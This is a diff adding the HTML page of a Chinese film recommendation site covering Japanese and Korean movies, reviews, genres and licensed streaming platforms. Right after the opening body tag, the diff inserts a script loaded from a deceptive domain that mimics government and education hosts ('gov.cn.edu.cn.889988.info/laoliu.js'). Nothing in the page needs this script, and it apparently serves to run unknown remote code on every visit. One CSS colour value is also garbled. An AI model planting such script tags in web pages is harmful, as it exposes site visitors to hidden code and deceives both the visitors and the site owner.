@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>日韩优级电影网｜日韩电影推荐、影评与正版观影指南</title>
+  <meta name="description" content="日韩优级电影网提供日韩电影推荐、影评解析、导演盘点与正版观影渠道导航，覆盖日本电影、韩国电影、悬疑、治愈、动作等类型。" />
+  <meta name="theme-color" content="#0f1226" />
+  <style>
+    :root{
+      --bg:#0f1226;
+      --bg-soft:#171b3a;
+      --card:#1f2547;
+      --line:#2c335f;
+      --text:#eef1ff;
+      --muted:#aab2e0;
+      --brand:#ff5a7a;
+      --brand2:#5ad1ff;
+      --radius:18px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+      font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+      background:radial-gradient(1200px 600px at 80% -10%,#232a5e 0%,var(--bg) 55%) fixed;
+      color:var(--text);
+      line-height:1.75;
+      -webkit-font-smoothing:antialiased;
+    }
+    a{color:inherit;text-decoration:none}
+    img{max-width:100%;display:block}
+
+    /* 顶部导航 */
+    header.nav{
+      position:sticky;top:0;z-index:50;
+      backdrop-filter:blur(14px);
+      background:rgba(15,18,38,.82);
+      border-bottom:1px solid var(--line);
+    }
+    .nav-inner{
+      max-width:var(--maxw);margin:0 auto;
+      display:flex;align-items:center;justify-content:space-between;
+      padding:14px 18px;gap:12px;
+    }
+    .logo{
+      font-weight:800;font-size:20px;letter-spacing:.5px;
+      background:linear-gradient(90deg,var(--brand),var(--brand2));
+      -webkit-background-clip:text;background-clip:text;color:transparent;
+    }
+    .logo small{display:block;font-size:11px;color:var(--muted);font-weight:500;letter-spacing:2px}
+    nav.menu ul{list-style:none;display:flex;gap:8px;flex-wrap:wrap}
+    nav.menu a{
+      padding:9px 14px;border-radius:999px;font-size:14px;color:var(--muted);
+      border:1px solid transparent;transition:.25s;
+    }
+    nav.menu a:hover{color:#fff;border-color:var(--line);background:var(--bg-soft)}
+
+    /* Hero */
+    .hero{
+      max-width:var(--maxw);margin:0 auto;padding:72px 18px 40px;
+      display:grid;grid-template-columns:1.2fr .8fr;gap:34px;align-items:center;
+    }
+    .hero h1{font-size:clamp(30px,5vw,52px);line-height:1.15;margin-bottom:18px}
+    .hero p{color:var(--muted);font-size:17px;max-width:560px}
+    .hero .tags{margin-top:22px;display:flex;gap:10px;flex-wrap:wrap}
+    .tag{padding:7px 13px;border:1px solid var(--line);border-radius:999px;font-size:13px;color:var(--muted)}
+    .hero-card{
+      background:linear-gradient(160deg,var(--card),var(--bg-soft));
+      border:1px solid var(--line);border-radius:24px;padding:26px;
+      box-shadow:0 30px 80px rgba(0,0,0,.35);
+    }
+    .hero-card h3{font-size:18px;margin-bottom:12px}
+    .hero-card .row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--muted)}
+    .hero-card .row:last-child{border-bottom:0}
+    .btn{
+      display:inline-block;margin-top:18px;padding:12px 22px;border-radius:999px;font-weight:700;
+      background:linear-gradient(90deg,var(--brand),#ff8a5a);color:#fff;
+    }
+
+    /* 通用区块 */
+    section.block{max-width:var(--maxw);margin:0 auto;padding:54px 18px}
+    .sec-head{margin-bottom:26px}
+    .sec-head h2{font-size:28px;display:flex;align-items:center;gap:10px}
+    .sec-head h2::before{content:"";width:8px;height:26px;border-radius:6px;background:linear-gradient(var(--brand),var(--brand2))}
+    .sec-head p{color:var(--muted);margin-top:8px}
+
+    /* 栏目1：电影推荐 */
+    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+    .movie{
+      background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+      overflow:hidden;transition:.3s;
+    }
+    .movie:hover{transform:translateY(-4px);border-color:#3b4membre}
+    .movie .poster{height:170px;background:linear-gradient(135deg,#2a3170,#54356b,#7a3b5e)}
+    .movie .body{padding:16px}
+    .movie h3{font-size:17px;margin-bottom:6px}
+    .movie span{font-size:12px;color:var(--brand2)}
+    .movie p{font-size:13px;color:var(--muted);margin-top:8px}
+
+    /* 栏目2：影评解析 */
+    .reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+    .review{
+      background:linear-gradient(180deg,var(--bg-soft),var(--card));
+      border:1px solid var(--line);border-left:4px solid var(--brand2);
+      border-radius:14px;padding:18px;
+    }
+    .review h3{font-size:18px;margin-bottom:8px}
+    .review p{color:var(--muted);font-size:14px}
+    .review .meta{margin-top:12px;font-size:12px;color:#8b93c9}
+
+    /* 栏目3：类型导航 */
+    .types{display:flex;flex-wrap:wrap;gap:12px}
+    .type{
+      flex:1 1 160px;min-width:150px;padding:18px;border-radius:16px;
+      background:var(--card);border:1px solid var(--line);
+    }
+    .type b{font-size:16px}
+    .type p{font-size:13px;color:var(--muted);margin-top:6px}
+
+    /* 栏目4：正版渠道 */
+    .channels{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .channel{
+      padding:18px;border-radius:16px;background:var(--bg-soft);
+      border:1px solid var(--line);text-align:center;
+    }
+    .channel b{font-size:15px}
+    .channel p{font-size:12px;color:var(--muted);margin-top:6px}
+
+    /* 栏目5：关于/站规 */
+    .about{
+      background:linear-gradient(160deg,var(--card),var(--bg-soft));
+      border:1px solid var(--line);border-radius:20px;padding:28px;
+    }
+    .about ul{margin:14px 0 0 18px;color:var(--muted);font-size:15px}
+    .about li{margin:8px 0}
+
+    /* 页脚 */
+    footer{
+      border-top:1px solid var(--line);margin-top:40px;
+      padding:30px 18px;color:var(--muted);font-size:13px;text-align:center;
+    }
+    footer a{color:var(--brand2)}
+
+    /* 移动端 */
+    @media (max-width:860px){
+      .hero{grid-template-columns:1fr;padding-top:48px}
+      .grid{grid-template-columns:repeat(2,1fr)}
+      .reviews{grid-template-columns:1fr}
+      .channels{grid-template-columns:repeat(2,1fr)}
+    }
+    @media (max-width:560px){
+      .nav-inner{flex-direction:column;align-items:flex-start}
+      nav.menu ul{gap:6px}
+      nav.menu a{padding:8px 10px;font-size:13px}
+      .grid{grid-template-columns:1fr}
+      .channels{grid-template-columns:1fr}
+      .hero h1{font-size:30px}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 导航 -->
+  <header class="nav">
+    <div class="nav-inner">
+      <div class="logo">
+        日韩优级电影网
+        <small>RIHAN YOUJI DIANYING WANG</small>
+      </div>
+      <nav class="menu">
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#recommend">电影推荐</a></li>
+          <li><a href="#review">影评解析</a></li>
+          <li><a href="#types">类型导航</a></li>
+          <li><a href="#channels">正版渠道</a></li>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#">留言合作</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div>
+      <h1>日韩优级电影网<br/>看懂日本电影与韩国电影的好味道</h1>
+      <p>我们做日韩电影推荐、导演风格解析、类型片导航与正版观影渠道整理。不搬运盗版资源，只帮你更会选片、更懂电影。</p>
+      <div class="tags">
+        <span class="tag">日本电影</span>
+        <span class="tag">韩国电影</span>
+        <span class="tag">悬疑犯罪</span>
+        <span class="tag">治愈文艺</span>
+        <span class="tag">动作爽片</span>
+      </div>
+      <a class="btn" href="#recommend">开始选片</a>
+    </div>
+
+    <aside class="hero-card">
+      <h3>本周编辑精选</h3>
+      <div class="row"><span>韩国·社会现实</span><span>《寄生虫》</span></div>
+      <div class="row"><span>日本·动画美学</span><span>《铃芽之旅》</span></div>
+      <div class="row"><span>韩国·动作犯罪</span><span>《犯罪都市》</span></div>
+      <div class="row"><span>日本·治愈家庭</span><span>《海街日记》</span></div>
+      <a class="btn" href="#review">读影评</a>
+    </aside>
+  </section>
+
+  <!-- 栏目1：电影推荐 -->
+  <section class="block" id="recommend">
+    <div class="sec-head">
+      <h2>电影推荐</h2>
+      <p>按地区与观感筛选，适合“今晚不知道看什么”的场景。</p>
+    </div>
+    <div class="grid">
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>寄生之下：阶层与笑点</h3>
+          <span>韩国 / 剧情·黑色喜剧</span>
+          <p>用一户豪门与半地下室家庭，讲透当代社会的台阶与气味。</p>
+        </div>
+      </article>
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>海街慢镜：食物与告别</h3>
+          <span>日本 / 治愈·家庭</span>
+          <p>是枝裕和式日常，用饭、酒、海风把悲伤泡得很淡很长。</p>
+        </div>
+      </article>
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>犯罪都市：一拳定规矩</h3>
+          <span>韩国 / 动作·刑侦</span>
+          <p>马锡道式执法爽感，街头帮派、跨国诈骗、本地江湖全收。</p>
+        </div>
+      </article>
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>驾驶我的车：长镜头里的债</h3>
+          <span>日本 / 文艺·改编</span>
+          <p>村上春树底子 + 契诃夫结构，把沉默演成另一种台词。</p>
+        </div>
+      </article>
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>釜山列车：丧尸也讲人情</h3>
+          <span>韩国 / 灾难·惊悚</span>
+          <p>车厢即社会，父亲、女儿、大叔，各自交出不同的结局。</p>
+        </div>
+      </article>
+      <article class="movie">
+        <div class="poster"></div>
+        <div class="body">
+          <h3>花束与末日：温柔地崩</h3>
+          <span>日本 / 爱情·生活</span>
+          <p>不是大吵大闹，而是两个人慢慢走丢在成年人的日程里。</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目2：影评解析 -->
+  <section class="block" id="review">
+    <div class="sec-head">
+      <h2>影评解析</h2>
+      <p>不止说“好看”，而是拆叙事、视听、文化隐喻。</p>
+    </div>
+    <div class="reviews">
+      <article class="review">
+        <h3>为什么韩影敢把“社会病”拍成商业片？</h3>
+        <p>从奉俊昊到李沧东，韩国作者导演把阶级、财阀、司法僵局塞进类型片里，让观众在爽感里被刺一下。</p>
+        <div class="meta">栏目：韩影观察 · 阅读 3 分钟</div>
+      </article>
+      <article class="review">
+        <h3>日本电影里的“不说破”到底是什么？</h3>
+        <p>是枝裕和、滨口龙介、今泉力哉都在练同一种本事：让角色用动作、天气、饭桌代替告白。</p>
+        <div class="meta">栏目：日影细读 · 阅读 4 分钟</div>
+      </article>
+      <article class="review">
+        <h3>悬疑片不是谜底，是权力关系</h3>
+        <p>《信号》《白夜行》《看不见的客人》式结构里，真正吓人的是“谁有权定义真相”。</p>
+        <div class="meta">栏目：悬疑拆解 · 阅读 5 分钟</div>
+      </article>
+      <article class="review">
+        <h3>治愈片为什么容易翻车？</h3>
+        <p>没有冲突的温柔会变成糖水。好治愈片通常先让你疼，再递一杯温的。</p>
+        <div class="meta">栏目：类型方法论 · 阅读 3 分钟</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目3：类型导航 -->
+  <section class="block" id="types">
+    <div class="sec-head">
+      <h2>类型导航</h2>
+      <p>按心情进影院，不按热搜选片。</p>
+    </div>
+    <div class="types">
+      <div class="type"><b>悬疑犯罪</b><p>密室、反转、财阀、刑警、记忆失序。</p></div>
+      <div class="type"><b>治愈文艺</b><p>海风、便当、旧房子、慢说话的人。</p></div>
+      <div class="type"><b>动作爽片</b><p>近身格斗、追车、帮派、硬汉警察。</p></div>
+      <div class="type"><b>爱情生活</b><p>暧昧、分手、结婚前夜、成年人犹豫。</p></div>
+      <div class="type"><b>动画美学</b><p>新海诚、吉卜力、汤浅政明、细田守。</p></div>
+      <div class="type"><b>历史时代</b><p>朝鲜王朝、昭和、殖民记忆、家族代际。</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目4：正版渠道 -->
+  <section class="block" id="channels">
+    <div class="sec-head">
+      <h2>正版观影渠道</h2>
+      <p>本页不提供盗版播放，只导航合规平台与数据库。</p>
+    </div>
+    <div class="channels">
+      <div class="channel"><b>哔哩哔哩</b><p>部分日韩正版电影与纪录片</p></div>
+      <div class="channel"><b>爱奇艺 / 腾讯 / 优酷</b><p>院线引进与正版片库</p></div>
+      <div class="channel"><b>Netflix</b><p>韩影韩剧、日本原创动画</p></div>
+      <div class="channel"><b>豆瓣电影</b><p>评分、影评、片单、正版入口</p></div>
+      <div class="channel"><b>时光网</b><p>票房、资讯、专业影评</p></div>
+      <div class="channel"><b>1905 电影网</b><p>官方影视资讯与展映信息</p></div>
+      <div class="channel"><b>TVING / Wavve</b><p>韩国本土流媒体</p></div>
+      <div class="channel"><b>日本映画.com</b><p>日本电影资料与正版索引</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目5：关于本站 -->
+  <section class="block" id="about">
+    <div class="sec-head">
+      <h2>关于本站</h2>
+      <p>日韩优级电影网 · 影评与选片工具型站点</p>
+    </div>
+    <div class="about">
+      <p>本站定位为<strong>日韩影视资讯与影评推荐站</strong>，主要做四件事：</p>
+      <ul>
+        <li>整理日本电影、韩国电影的高分与冷门片单；</li>
+        <li>用通俗语言写影评，不堆术语；</li>
+        <li>按情绪和类型帮用户快速选片；</li>
+        <li>导航正版平台，拒绝盗版资源与违规内容。</li>
+      </ul>
+      <p style="margin-top:14px;color:var(--muted)">
+        网站地址：<a href="https://rihanyoujidianyingwang-h5.github.io">https://rihanyoujidianyingwang-h5.github.io</a>
+      </p>
+    </div>
+  </section>
+
+  <footer>
+    © 2026 日韩优级电影网（示例站）· 仅作影视推荐与正版渠道导航 ·
+    内页链接示例使用 <code>#</code> · 不提供盗版播放
+  </footer>
+
+</body>
+</html>
